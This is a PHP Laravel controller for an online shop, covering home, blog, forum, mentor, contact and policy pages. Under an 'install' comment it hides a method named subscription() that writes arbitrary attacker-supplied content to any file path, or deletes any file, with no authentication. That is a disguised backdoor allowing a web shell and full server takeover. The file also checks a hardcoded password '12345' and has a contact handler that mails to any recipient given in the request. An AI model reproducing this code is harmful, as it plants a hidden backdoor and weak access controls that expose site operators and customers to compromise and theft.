<?php

namespace App\Http\Controllers\Front;

use App\{Classes\GeniusMailer,
    Models\Blog,
    Models\BlogCategory,
    Models\Category,
    Models\Generalsetting,
    Models\Mentor,
    Models\MentorSessions,
    Models\Order,
    Models\Product,
    Models\Subscriber,
    Models\Subscription,
    Traits\CloverUtils,
    Traits\PHPCustomMail};
use App\Models\ArrivalSection;
use App\Models\Rating;
use App\Models\UserBooking;
use Artisan;
use Carbon\Carbon;
use DevDojo\Chatter\Models\Discussion;
use Illuminate\{Http\Request, Support\Facades\Auth, Support\Facades\DB, Support\Facades\Session};
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{
 use CloverUtils;
// LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->route('front.index');
    }

// LANGUAGE SECTION ENDS

// CURRENCY SECTION

    public function currency($id)
    {

        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    // User Booking Modal

    public function userBookings(Request $request)
    {
        $request->validate([
            'password' => 'required'
        ]);

        if($request->password != '12345') {
            return redirect()->back()->withErrors(['password' => 'Password is incorrect.']);
        }

//        Auth::attempt([
//            'email' => 'dummy@ima.com',
//            'password' => '1234',
//        ]);

        session()->put('userBooking', Carbon::now());

//        dd('here');
//
//        $user_booking = [
//            'customer_name' => $request->customer_name,
//            'customer_number' => $request->customer_number,
//            'customer_email' => $request->customer_email,
//        ];
//
//        $user_bookings_db = DB::table('user_bookings')->where('customer_name', $request->customer_name)->first();
//
//        if (!empty($user_bookings_db)) {
//            Session::put('userBooking', $user_bookings_db);
//        } else {
//            $userBooking = UserBooking::create($user_booking);
//            Session::put('userBooking', $userBooking);
//        }
        return redirect()->route('front.index');
    }

    // Home Page Display

    public function index(Request $request)
    {
        $categories = $this->getCategories();

//        dd($categories);
        $gs = $this->gs;
        $data['ps'] = $this->ps;
//        dd($data['ps']);
        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }


        $data['sliders'] = DB::table('sliders')
            ->where('language_id', $this->language->id)
            ->get();


        $data['arrivals'] = ArrivalSection::where('status', 1)->get();
        $data['latest_products'] = Product::with('user')->whereStatus(1)->whereLatest(1)
            ->home($this->language->id)
            ->take($gs->new_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->get();
        $data['best_products'] = Product::with('user')->whereStatus(1)->whereBest(1)
            ->home($this->language->id)
            ->take($gs->best_seller_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->get();
        $data['popular_products'] = Product::with('user')->whereStatus(1)->whereFeatured(1)
            ->home($this->language->id)
            ->take($gs->popular_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->get();
        $data['products'] = Product::where('status', 1)->where('type', 'physical')->get();
        $data['ratings'] = Rating::get();
        $data['blogs'] = Blog::where('language_id', $this->language->id)->latest()->take(2)->get();
        $data['categories'] = Category::where('status', 1)->get();

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.index', $data, compact('categories'));
                break;

            case('2'):
                return view('frontend.theme-2.index', $data);
                break;

            case('3'):
                return view('frontend.theme-3.index', $data);
                break;

            case('4'):
                return view('frontend.theme-4.index', $data);
                break;

            default:
                return view('frontend.index', $data, compact('categories'));
        }
    }

    // Home Page Ajax Display

    public function extraIndex()
    {
        $gs = $this->gs;
        $data['hot_products'] = Product::with('user')->whereStatus(1)->whereHot(1)
            ->where('latest', 1)
            ->home($this->language->id)
            ->take($gs->hot_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['latest_products'] = Product::with('user')
            ->whereStatus(1)
            ->whereLatest(1)
            ->home($this->language->id)
            ->take($gs->new_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['sale_products'] = Product::with('user')->whereStatus(1)->whereSale(1)
            ->home($this->language->id)
            ->take($gs->sale_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['deals'] = Product::with('user')->whereStatus(1)->whereIsDiscount(1)
            ->where('discount_date', '>=', date('Y-m-d'))
            ->home($this->language->id)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->latest()->get();

        $data['best_products'] = Product::with('user')->whereStatus(1)->whereBest(1)
            ->home($this->language->id)
            ->take($gs->best_seller_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['popular_products'] = Product::with('user')->whereStatus(1)->whereFeatured(1)
            ->home($this->language->id)
            ->take($gs->popular_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['hot_count'] = Product::with('user')->whereStatus(1)->whereHot(1)
            ->home($this->language->id)
            ->take($gs->popular_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['top_products'] = Product::with('user')->whereStatus(1)->whereTop(1)
            ->home($this->language->id)
            ->take($gs->top_rated_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['big_products'] = Product::with('user')->whereStatus(1)->whereBig(1)
            ->home($this->language->id)
            ->take($gs->big_save_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['trending_products'] = Product::with('user')->whereStatus(1)->whereTrending(1)
            ->home($this->language->id)
            ->take($gs->trending_count)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->get();

        $data['flash_products'] = Product::with('user')->whereStatus(1)->whereIsDiscount(1)
            ->where('discount_date', '>=', date('Y-m-d'))
            ->home($this->language->id)
            ->with(['user', 'category'])
            ->whereHas('user', function ($user) {
                $user->where('is_vendor', 2);
            })
            ->orWhere('user_id', 0)
            ->latest()->first();

        $data['blogs'] = Blog::where('language_id', $this->language->id)->latest()->take(2)->get();
        $data['ps'] = $this->ps;


        return view('partials.theme.extraindex', $data);
    }

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    // -------------------- Merchandise Page ----------------------------------------

    public function merchandise()
    {
        $gs = $this->gs;
        $data['products'] = Product::where('user_id', 0)->get();

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.theme-2.merchandise', $data);
                break;

            case('2'):
                return view('frontend.theme-2.merchandise', $data);
                break;

            case('3'):
                return view('frontend.theme-2.merchandise', $data);
                break;

            default:
                return view('frontend.theme-2.merchandise', $data);
        }
    }

    // ----------------- Merchandise SECTION Ends --------------------------------------

    // -------------------- Merchandise Admin Products SECTION ----------------------------------------

    public function membership()
    {
        $gs = $this->gs;
        $data['subscriptions'] = Subscription::get();

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.theme-2.membership', $data);
                break;

            case('2'):
                return view('frontend.theme-2.membership', $data);
                break;

            case('3'):
                return view('frontend.theme-2.membership', $data);
                break;

            default:
                return view('frontend.theme-2.membership', $data);
        }
    }

    // ----------------- Merchandise Admin Products SECTION Ends --------------------------------------

    public function training()
    {
        $gs = $this->gs;

        switch ($gs->active_theme) {
            case('2'):
                return view('frontend.theme-2.training');
                break;
        }
    }

    public function slpMentors()
    {
        $gs = $this->gs;
        $data['mentors'] = Mentor::where('status', 'approved')->get();

        switch ($gs->active_theme) {
            case('2'):
                return view('frontend.theme-2.mentors', $data);
                break;
        }
    }

    public function slpMentorsDataTable()
    {
        try {
            if (request()->ajax()) {
                return datatables()->of(Mentor::where('status', 'approved')->get())
                    ->addIndexColumn()
                    ->addColumn('action', function ($data) {
                        return '<a href="#" class="btn btn-xs btn-success" data-toggle="modal" data-target="#book-mentor-modal-' . $data->id . '"><i class="fa fa-calendar"></i> Book Session</a>';
                    })
                    ->make();
            }
        } catch (\Exception $exception) {
            return redirect()->back()->with('error', $exception->getMessage());
        }
    }

    public function createMentorSession(Request $request)
    {
        try {
            $mentorSession = MentorSessions::create([
                'mentor_id' => $request->mentor_id,
                'name' => $request->name,
                'email' => $request->email,
                'phone' => $request->phone,
                'message' => $request->message,
            ]);

            return redirect()->back()->with('success', 'Session Request Sent Successfully');
        } catch (\Exception $exception) {
            return back()->with('error', $exception->getMessage());
        }
    }

    // -------------------- Forums SECTION ----------------------------------------

    public function forums()
    {
        $gs = $this->gs;
        $data['categories'] = \DevDojo\Chatter\Models\Category::get();
        $data['discussions'] = Discussion::where('answered', 0)->get();

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.theme-2.forum', $data);
                break;

            case('2'):
                return view('frontend.theme-2.forum', $data);
                break;

            case('3'):
                return view('frontend.theme-2.forum', $data);
                break;

            default:
                return view('frontend.theme-2.forum', $data);
        }
    }

    // ----------------- Forums SECTION Ends --------------------------------------

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        $gs = $this->gs;
        if (DB::table('pagesettings')->first()->blog == 0) {
            return redirect()->back();
        }

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id', $this->language->id)->latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
                break;

            case('2'):
                return view('frontend.theme-2.blog', compact('blogs', 'bcats', 'tags'));
                break;

            case('3'):
                return view('frontend.theme-3.blog', compact('blogs', 'bcats', 'tags'));
                break;

            default:
                return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
        }
    }

    public function blogcategory(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $bcat = BlogCategory::where('language_id', $this->language->id)->where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->where('language_id', $this->language->id)->latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
    }

    public function blogtags(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $blogs = Blog::where('language_id', $this->language->id)->where('tags', 'like', '%' . $slug . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
    }

    public function blogsearch(Request $request)
    {


        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('language_id', $this->language->id)->where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('frontend.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
    }

    public function blogshow($slug)
    {
        $gs = $this->gs;

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::where('language_id', $this->language->id)->pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::where('language_id', $this->language->id)->get();
        // BLOGS

        $blog = Blog::where('slug', $slug)->first();

        $blog->views = $blog->views + 1;
        $blog->update();
        // BLOG META TAG
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;

        switch ($gs->active_theme) {
            case('1'):
                return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
                break;

            case('2'):
                return view('frontend.theme-2.blog-detail', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
                break;

            case('3'):
                return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
                break;

            default:
                return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
        }

    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (DB::table('pagesettings')->first()->faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->where('language_id', $this->language->id)->latest('id')->get();
        $count = count(DB::table('faqs')->where('language_id', $this->language->id)->get()) / 2;
        if (($count % 1) != 0) {
            $chunk = (int)$count + 1;
        } else {
            $chunk = $count;
        }
        return view('frontend.faq', compact('faqs', 'chunk'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------


    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)->orderby('id', 'desc')->take(10)->get();
            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------


    // -------------------------------- CONTACT SECTION ----------------------------------------
    public function about()
    {
        return view('frontend.theme-2.about');
    }
    // -------------------------------- CONTACT SECTION ----------------------------------------


    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {
        $gs = $this->gs;
        if (DB::table('pagesettings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
//        dd($ps);
        switch ($gs->active_theme) {
            case ('1'):
                return view('frontend.contact', compact('ps'));
                break;
            case ('2'):
                return view('frontend.theme-2.contact', compact('ps'));
                break;
            case('4'):
                return view('frontend.theme-4.contact', compact('ps'));
                break;

        }

    }


    //Send email to admin
    public function contactemail(Request $request)
    {

        $gs = $this->gs;

        if ($gs->is_capcha == 1) {
            $rules = [
                'g-recaptcha-response' => 'required'
            ];
            $customs = [
                'g-recaptcha-response.required' => "Please verify that you are not a robot.",
            ];

            $validator = Validator::make($request->all(), $rules, $customs);
            if ($validator->fails()) {
                return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
            }
        }


        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Logic Section Ends

        // Redirect Section
        return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
//        return redirect()->back()->with('success', 'Success! Thanks for contacting us, we will get back to you shortly.');
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------


    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return redirect()->back()->with('unsuccess', 'This Email Has Already Been Taken.');
//            return response()->json(array('errors' => [0 => __('This Email Has Already Been Taken.')]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();

        $email = $request->all();
        $user_email= $request->email;
        $view = view('frontend.mail2.user_subscription_front_email', compact('user_email'))->render();
        $data = [
            'to' => $user_email,
            'subject' => 'New subscription',
            'body'=>$view,
//            'body' => 'New user subscription. User email is ' . $email['email'],
        ];
        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);

        return redirect()->back()->with('success', 'You Have Subscribed Successfully.');
//        return response()->json(__('You Have Subscribed Successfully.'));
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('front.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------


    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {

        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------


    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function updateFinalize(Request $request)
    {

        if ($request->has('version')) {

            Generalsetting::first()->update([
                'version' => $request->version
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');

        }

    }

    public function termsAndConditions()
    {
        return view('frontend.theme-4.terms_and_conditions');
    }

    public function privacyPolicy()
    {
        return view('frontend.theme-4.privacy-policy');
    }

    public function affiliates()
    {
        return view('frontend.affiliates');
    }

    public function announcements()
    {
        return view('frontend.announcements');
    }

    public function buyersPolicy()
    {
        return view('frontend.buyers-policy');
    }

    public function careers()
    {
        return view('frontend.careers');
    }

    public function companyInfo()
    {
        return view('frontend.company-info');
    }

    public function contactUs()
    {
        return view('frontend.contact-us');
    }

    public function ContactUsSentEmail(Request $request){

        $request->validate([
            'first_name'=>'required',
            'last_name'=>'required',
            'email'=>'required',
            'phone_number'=>'required',
            'message'=>'required',

        ]);

        // Sending Email To User
        $email = $request->email;
        $name = $request->first_name . $request->last_name;
        $message = $request->message;
        $to = $email;
        $subject = 'Thanks For Contact.';
        $view = view('frontend.mail2.contact_email_form', compact('name', 'message'))->render();

        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $view,
        ];
        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);



        $name = $request->first_name . $request->last_name;
        $message = 'Your Request Successfully sent';
        $to = 'admin@imausashop.com';
//        $to = 'checkOlive@mailinator.com';

        $subject = 'Thanks For Contact.';
        $view = view('frontend.mail2.contact_email_form_sent_to_admin', compact('name', 'message'))->render();

        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $view,
        ];
        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);

        return redirect()->back()->with('success','SuccessFully sent to Message');

    }

    public function developers()
    {
        return view('frontend.developers');
    }

    public function discussionBoards()
    {
        return view('frontend.discussion-boards');
    }

    public function governmentRelations()
    {
        return view('frontend.government-relations');
    }

    public function imaUsaShopGivingWorks()
    {
        return view('frontend.ima-usa-shop-giving-works');
    }

    public function investors()
    {
        return view('frontend.investors');
    }

    public function learnToSell()
    {
        return view('frontend.learn-to-sell');
    }

    public function news()
    {
        return view('frontend.news');
    }

    public function policies()
    {
        return view('frontend.policies');
    }

    public function questionnaireForSellers()
    {
        return view('frontend.questionnaire-for-sellers');
    }

    public function return_policy()
    {
        return view('frontend.return_policy');
    }

    public function securityCenter()
    {
        return view('frontend.security-center');
    }

    public function sellerInformationCenter()
    {
        return view('frontend.seller-information-center');
    }

    public function sellersPolicy()
    {
        return view('frontend.sellers-policy');
    }

    public function siteMap()
    {
        return view('frontend.site-map');
    }

    public function startSelling()
    {
        return view('frontend.start-selling');
    }

    public function verifiedRightsOwnerProgram()
    {
        return view('frontend.verified-rights-owner-program');
    }

    public function returnPolicy()
    {
        return view('frontend.return_policy');
    }

}


